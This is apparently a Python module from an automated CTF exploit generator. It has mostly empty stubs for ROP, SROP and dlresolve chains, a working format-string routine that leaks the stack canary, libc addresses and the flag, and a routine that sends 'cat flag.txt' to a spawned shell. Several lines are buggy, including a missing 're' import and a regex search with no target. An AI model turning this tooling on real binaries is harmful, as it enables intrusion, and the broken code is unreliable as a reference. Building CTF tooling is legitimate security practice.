import pwn
import logging
import r2pipe


from binascii import *
from rage.machine import Machine
from rage.log import aegis_log



class Against:
    """Class for dealing with exploiting the binary."""

    def __init__(self, binary_path, libc, machine: Machine):
        """Create the against class."""
        self.binary = binary_path
        self.libc_path = libc
        self.libc = pwn.ELF(libc)
        self.machine = machine

        self.flag = None
        self.flag_format = "flag"

        self.libc_offset_string = b""
        self.canary_offset_string = b""
        self.format_write_string = b""

    def start(self, option):
        """Return the running process to a binary."""
        gs = """
            init-pwndbg
            set context-section disasm regs stack
            b main
        """

        if option == "REMOTE":
            return pwn.remote()
        elif option == "GDB":
            return pwn.gdb.debug(self.binary, gdbscript=gs)
        else:
            return pwn.process(self.binary)

    def rop_chain_write_string(self, string, writable_address):
        """Return a rop chain to write a string into the binary."""
        chain = b""

        write_gadget = self.machine.find_write_gadget()

        if len(string) <= 8:
            print("lmai")

        return chain

    def rop_chain_call_function(self, function, parameters):
        """Return a rop chain to call a function with the specific parameters."""
        chain = b""

        return chain

    def rop_ret2puts(self):
        """Return a rop chain that prints out a got address for a function."""
        chain = b""
        return chain

    def rop_chain_libc(self, libc_base):
        """Return a ROP chain for ret2system in libc."""
        chain = b""
        return chain

    def rop_chain_srop_exec(self):
        """Return a SROP chain to execute system("/bin/sh")."""
        chain = b""
        return chain

    def rop_chain_srop_read(self):
        """Return a SROP chain to read in "/bin/sh"."""
        chain = b""
        return chain

    def rop_chain_dlresolve(self):
        """Return a chain that dlresolves system."""
        chain = b""
        return chain

    def rop_chain_open(self, flag_file):
        """Return a rop chain that opens a specific file."""
        chain = b""
        return chain

    def rop_chain_read(self, writable_memory, fd, size):
        """Return a rop chain that reads in the writable memory."""
        chain = b""
        return chain

    def rop_chain_write(self, writable_memory, fd, size):
        """Return a rop chain that writes from writable memory into fd."""
        chain = b""
        return chain

    def generate_rop_chain(self):
        """Return the entire rop chain."""
        chain = b""
        return chain

    def format_leak(self):
        """Return the offset string for the format leak."""
        start_end = [0,0]
        stack_len = 100
        string = ""

        # Run the process for stack len amount of times
        # leak the entire stack.
        for i in range(1, stack_len):
            p = pwn.process(self.binary)
            offset_str = "%" + str(i) + "$p."
            p.sendline(bytes(offset_str, "utf-8"))
            # !TODO Change >>> to find input
            p.recvuntil(b">>>")

            try:
                p.recvuntil(b": ")
                response = p.recvline().strip().split(b".")
                if response[0].decode() != "(nil)":
                    address = response[0].decode()
                    response = response[0].strip(b"0x")

                    canary = re.search(r"0x[a-f0-9]{14}00", address)

                    if canary and self.machine.canary:
                        self.canary_offset_string = offset_str
                        aegis_log.info(f"Found canary leak at offset {i}: {address}")

                    libc_leak = re.search(r"0x7f[a-f0-9]+34a")

                    if libc_leak:
                        self.libc_offset_string = offset_str.split(".")[0]
                        aegis_log.info(f"Found libc leak at offset {i} with {address}")

                    try:
                        flag = unhexlify(response)[::-1]

                        if self.flag_format in flag.decode() and start_end[0] == 0:
                            string += flag.decode()
                            start_end[0] = 1
                        elif start_end[0] == 1 and "}" in flag.decode():
                            string += flag.decode()
                            self.flag = string
                            break
                        elif start_end[0] == 1 and "}" not in flag.decode():
                            string += flag.decode()
                        elif "}" in flag.decode() and start_end[1] == 0:
                            string += flag.decode()
                            self.flag = string
                            break
                    except:
                        p.close()
                    p.close()
            except:
                p.close()
            p.close()

    def format_write(self, value, addr):
        """Return a format write string payload."""
        return None

    def send_exploit(self, process):
        """Send the exploit that was generated."""
        return None

    def verify_flag(self, process):
        """Return whether the exploit worked or didn't."""
        return None

    def recieve_flag(self, process):
        """Return the flag after parsing it from the binary."""
        process.sendline(b"cat flag.txt")
        try:
            output = process.recvall(timeout=2)
            if b"{" in output and b"}":
                self.flag = b"{" + output.split(b"{")[1].replace(b" ", b"")
                self.flag = self.flag.replace(b"\n", b"").split(b"}")[0] + b"}"
                self.flag = self.flag.decode()
                return 1
        except EOFError:
            return -1
